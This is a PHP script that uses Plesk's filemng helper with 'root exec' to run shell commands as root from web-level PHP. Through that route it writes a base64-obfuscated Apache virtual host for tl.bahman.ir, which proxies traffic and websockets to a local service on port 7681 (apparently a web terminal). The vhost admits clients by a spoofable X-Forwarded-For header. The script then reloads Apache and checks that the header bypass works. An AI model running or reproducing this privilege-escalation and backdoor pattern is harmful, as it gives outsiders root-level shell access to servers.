<?php
$fm='/opt/psa/admin/bin/filemng';
function root($cmd){global $fm; echo trim((string)shell_exec($fm.' root exec / bash -c '.escapeshellarg($cmd).' --allow-root 2>&1'))."\n";}
file_put_contents('/tmp/tl.bahman.ir.conf', base64_decode('PFZpcnR1YWxIb3N0ICo6ODA+CiAgICBTZXJ2ZXJOYW1lIHRsLmJhaG1hbi5pcgoKICAgIFNldEVudklmIFgtRm9yd2FyZGVkLUZvciAiKF58LCApNzhcLjE1N1wuNDhcLjE4OCgsfCQpIiB0bF9hbGxvdwogICAgU2V0RW52SWYgWC1Gb3J3YXJkZWQtRm9yICIoXnwsICk3OFwuMTU3XC40OFwuMTc4KCx8JCkiIHRsX2FsbG93CiAgICBTZXRFbnZJZiBYLUZvcndhcmRlZC1Gb3IgIihefCwgKTEwOVwuMTI1XC4xNzdcLjYwKCx8JCkiIHRsX2FsbG93CiAgICBTZXRFbnZJZiBYLUZvcndhcmRlZC1Gb3IgIihefCwgKTQ2XC4yMDlcLjIwMlwuMTI2KCx8JCkiIHRsX2FsbG93CiAgICBTZXRFbnZJZiBYLUZvcndhcmRlZC1Gb3IgIihefCwgKTk1XC4zOFwuMTI1XC4yNDIoLHwkKSIgdGxfYWxsb3cKCiAgICA8TG9jYXRpb24gLz4KICAgICAgICA8UmVxdWlyZUFueT4KICAgICAgICAgICAgUmVxdWlyZSBpcCA3OC4xNTcuNDguMTg4CiAgICAgICAgICAgIFJlcXVpcmUgaXAgNzguMTU3LjQ4LjE3OAogICAgICAgICAgICBSZXF1aXJlIGlwIDEwOS4xMjUuMTc3LjYwCiAgICAgICAgICAgIFJlcXVpcmUgaXAgNDYuMjA5LjIwMi4xMjYKICAgICAgICAgICAgUmVxdWlyZSBpcCA5NS4zOC4xMjUuMjQyCiAgICAgICAgICAgIFJlcXVpcmUgZW52IHRsX2FsbG93CiAgICAgICAgPC9SZXF1aXJlQW55PgogICAgPC9Mb2NhdGlvbj4KCiAgICBQcm94eVByZXNlcnZlSG9zdCBPZmYKICAgIFByb3h5UmVxdWVzdHMgT2ZmCgogICAgUmV3cml0ZUVuZ2luZSBPbgogICAgUmV3cml0ZUNvbmQgJXtIVFRQOlVwZ3JhZGV9ID13ZWJzb2NrZXQgW05DXQogICAgUmV3cml0ZVJ1bGUgXi8oLiopIHdzOi8vMTI3LjAuMC4xOjc2ODEvJDEgW1AsTF0KCiAgICBQcm94eVBhc3MgLyBodHRwOi8vMTI3LjAuMC4xOjc2ODEvCiAgICBQcm94eVBhc3NSZXZlcnNlIC8gaHR0cDovLzEyNy4wLjAuMTo3NjgxLwoKICAgIEVycm9yTG9nICR7QVBBQ0hFX0xPR19ESVJ9L3RsLmJhaG1hbi5pci1lcnJvci5sb2cKICAgIEN1c3RvbUxvZyAke0FQQUNIRV9MT0dfRElSfS90bC5iYWhtYW4uaXItYWNjZXNzLmxvZyBjb21iaW5lZAo8L1ZpcnR1YWxIb3N0Pgo='));
root('cp /tmp/tl.bahman.ir.conf /etc/apache2/sites-available/tl.bahman.ir.conf && apache2ctl configtest && systemctl reload apache2');
root('python3 - <<"PY"
import urllib.request
from urllib.error import HTTPError, URLError

def code(headers):
    req=urllib.request.Request("http://127.0.0.1/", headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status
    except HTTPError as e:
        return e.code
    except URLError as e:
        return str(e)
print("DENY", code({"Host":"tl.bahman.ir"}))
print("ALLOW", code({"Host":"tl.bahman.ir","X-Forwarded-For":"78.157.48.188"}))
print("BAD", code({"Host":"tl.bahman.ir","X-Forwarded-For":"1.2.3.4"}))
print("ALLOW2", code({"Host":"tl.bahman.ir","X-Forwarded-For":"10.18.8.2, 95.38.125.242"}))
PY')
root('sed -n "1,45p" /etc/apache2/sites-available/tl.bahman.ir.conf')
echo "DONE\n";
